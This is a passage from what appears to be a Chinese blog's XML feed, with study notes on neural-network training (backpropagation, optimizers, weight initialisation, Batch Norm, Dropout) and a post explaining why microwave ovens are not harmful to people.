        <content type="html"><![CDATA[<h2 id="误差反向传播法"><a href="#误差反向传播法" class="headerlink" title="误差反向传播法"></a>误差反向传播法</h2><a id="more"></a><h3 id="Affine-层（仿射变换）"><a href="#Affine-层（仿射变换）" class="headerlink" title="Affine 层（仿射变换）"></a>Affine 层（仿射变换）</h3><blockquote><p>神经网络的正向传播中进行的矩阵的乘积运算在几何学领域被称为“仿射变换”</p></blockquote><p>​    注：在affine层的反向传播过程中要注意矩阵形状</p><h3 id="梯度确认-gradient-check"><a href="#梯度确认-gradient-check" class="headerlink" title="梯度确认(gradient check)"></a>梯度确认(gradient check)</h3><blockquote><p>确认数值微分求出的梯度结果和误差反向传播法求出的结果是否一致的操作</p></blockquote><p>​    用于确认误差反向传播法的实现是否正确</p><h2 id="与学习相关的技巧"><a href="#与学习相关的技巧" class="headerlink" title="与学习相关的技巧"></a>与学习相关的技巧</h2><h3 id="最优化"><a href="#最优化" class="headerlink" title="最优化"></a>最优化</h3><blockquote><p>解决“寻找最优参数的问题”的过程</p></blockquote><h3 id="SGD"><a href="#SGD" class="headerlink" title="SGD"></a>SGD</h3><blockquote><p>$$<br>W= W-η\frac{\partial L}{\partial W}<br>$$</p></blockquote><p><strong>缺点</strong></p><blockquote><p>如果函数的形状非均向(anisotropic)，搜索的路径就会非常低效</p><p>抵消的根本原因：梯度的方向并没有指向最小值的方向</p></blockquote><h3 id="Momentum"><a href="#Momentum" class="headerlink" title="Momentum"></a>Momentum</h3><blockquote><p>$$<br>v=\alpha v - \eta \frac{\partial L}{\partial W}<br>$$</p><p>$$<br>W=W+v<br>$$</p></blockquote><h3 id="AdaGrad"><a href="#AdaGrad" class="headerlink" title="AdaGrad"></a>AdaGrad</h3><blockquote><p>$$<br>h=h+\frac{\partial L}{\partial W} .\frac{\partial L}{\partial W}<br>$$</p><p>$$<br>W=W-\eta \frac{1}{h^{\frac{1}{2}}}\frac{\partial L}{\partial W}<br>$$</p></blockquote><p>​    AdaGrad会记录过去所有梯度的平方和。因此，学习越深入，更新的幅度就越小。实际上，如果无止境的学习，更新量就会变成零</p><h3 id="Adam"><a href="#Adam" class="headerlink" title="Adam"></a>Adam</h3><blockquote><p>融合了Momentum和AdaGrad方法。通过组合前面两个方法的优点，有望实现参数空间的高效搜索</p><p>特征：超参数的“偏置校正”</p></blockquote><h3 id="权重的初始值"><a href="#权重的初始值" class="headerlink" title="权重的初始值"></a>权重的初始值</h3><p>​    将权重设置为0的问题</p><p>​    如果将权重设置为零，那么下一层的神经元会杯传递相同的值，从而达不到学习的效果（乘法反向传播的例子），则在反向传播时第二层的权重进行同样的更新，这使得神经网络拥有许多不同的权重的意义丧失了。即防止“权重均一化”（瓦解权重的对称结构）</p><h3 id="梯度消失（梯度爆炸）"><a href="#梯度消失（梯度爆炸）" class="headerlink" title="梯度消失（梯度爆炸）"></a>梯度消失（梯度爆炸）</h3><p>在运用链式法则时，由于运算时以连乘的形式进行，所以当层数很深时，随着层数的增加，计算出的梯度会指数级变化，如果是往小了变，就出现了<strong>梯度消失</strong>现象，如果是往大了变，就出现了<strong>梯度爆炸</strong>现象</p><h3 id="表现力受限"><a href="#表现力受限" class="headerlink" title="表现力受限"></a>表现力受限</h3><p>当传递给神经元的是有所偏向的数据时，有可能会出现<strong>表现力受限</strong>的问题，即多个神经元输出相同的结果，那同样可以由一个神经元完成的事情无疑令这些神经元的存在变得无意义</p><h3 id="Xavier初始值"><a href="#Xavier初始值" class="headerlink" title="Xavier初始值"></a>Xavier初始值</h3><blockquote><p>如果前一层的节点数为n，则初始值使用标准差为1/(n^(1/2))的分布</p></blockquote><h3 id="ReLU的权重初始值"><a href="#ReLU的权重初始值" class="headerlink" title="ReLU的权重初始值"></a>ReLU的权重初始值</h3><blockquote><p>当激活函数使用ReLU时，一般推荐使用ReLU专用的初始值，也称为“He初始值”</p><p>He初始值使用标准差为(2/n)^(1/2)的高斯分布</p></blockquote><h3 id="Batch-Nomalization-Batch-Norm"><a href="#Batch-Nomalization-Batch-Norm" class="headerlink" title="Batch Nomalization (Batch Norm)"></a>Batch Nomalization (Batch Norm)</h3><blockquote><p>以进行学习时的mini-batch为单位，按mini-batch进行正规化</p><p>进行使数据分布的均值为0，方差为1的正规化<br>$$<br>\mu <em>B=\frac{1}{m}\Sigma^m</em>{i=1}x_i<br>$$</p><p>$$<br>\sigma ^2_B=\frac{1}{m}\Sigma^m_{i=1}(x_i-\mu_B)^2<br>$$</p><p>$$<br>x_i=\frac{x_i-\mu_B}{\sqrt{\sigma_B^2+\epsilon}}<br>$$</p></blockquote><p>优点：</p><ul><li>可以使学习快速进行（可以增大学习率）</li><li>不那么依赖初始值（对于初始值不用那么神经质）</li><li>抑制过拟合（降低Dropou等的必要性）</li></ul><h3 id="过拟合"><a href="#过拟合" class="headerlink" title="过拟合"></a>过拟合</h3><blockquote><p>只能拟合训练数据，但不能很好地拟合不包含在训练数据中的其他数据的状态</p></blockquote><p>原因</p><ul><li> 模型拥有大量参数，表现力强</li><li>训练数据少</li></ul><h3 id="权值衰减"><a href="#权值衰减" class="headerlink" title="权值衰减"></a>权值衰减</h3><blockquote><p>通过在学习的过程中对大的权重进行惩罚，来抑制过拟合</p></blockquote><p>例：为损失函数加上权重的平方范数（1/2λW^2）</p><h3 id="Dropout"><a href="#Dropout" class="headerlink" title="Dropout"></a>Dropout</h3><blockquote><p>Dropout是一种在学习的过程中随机删除神经元的方法。训练时，随机选出隐藏层的神经元，然后将其删除。被删除的神经元不再进行信号的传递</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出、AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微波炉究竟有没有辐射</title>
      <link href="2021/11/30/microwave_oven/"/>
      <url>2021/11/30/microwave_oven/</url>
      
        <content type="html"><![CDATA[<blockquote><p>震惊！这个常见的家用电器竟有这么大的辐射</p></blockquote><a id="more"></a><h2 id="直奔主题，微波炉对人体究竟会不会产生危害"><a href="#直奔主题，微波炉对人体究竟会不会产生危害" class="headerlink" title="直奔主题，微波炉对人体究竟会不会产生危害"></a>直奔主题，微波炉对人体究竟会不会产生危害</h2><p>要知道微波炉是否会对人体产生危害，就得先知道什么程度的微波会对人体产生危害</p><blockquote><img src="https://www.helloimg.com/images/2021/11/30/Ga0JEt.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga0JEt.png" srcset="data:image/png;base64,666" alt="Ga0JEt.png" style="zoom:50%;" /><img src="https://www.helloimg.com/images/2021/11/30/Ga0xjQ.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga0xjQ.png" srcset="data:image/png;base64,666" alt="Ga0xjQ.png" style="zoom:50%;" /></blockquote><p>可以看出，只要50mm以外泄露的微波小于等于50W/m^2，就不会对人体造成影响，而市面上的绝大多数微波炉也都满足这一标准，即使在使用了一段时间后，虽然门把手及炉门密封处微波泄漏量略有上升，但也都在标准以内</p><p>顺便说一声，微波炉的产生的辐射属于非电离辐射，并不能破坏分子结构和产生电离作用；频率在2.45GHz左右，也就WIFI的频率，而且微波炉是在金属容器中工作的，这些金属容器能够很好地限制微波</p><p><strong>所以，微波炉不会对人体造成伤害</strong></p><h2 id="问题解答"><a href="#问题解答" class="headerlink" title="问题解答"></a>问题解答</h2><h4 id="微波炉泄漏的辐射会致畸？"><a href="#微波炉泄漏的辐射会致畸？" class="headerlink" title="微波炉泄漏的辐射会致畸？"></a>微波炉泄漏的辐射会致畸？</h4><details ><summary> 点击查看答案 </summary>              <div class='content'>              <p>同样是2.45GHz左右的频率，既然WIFI没有致畸作用，想必微波炉也不具备这样的能力</p><p><img src="data:image/jpeg;base64,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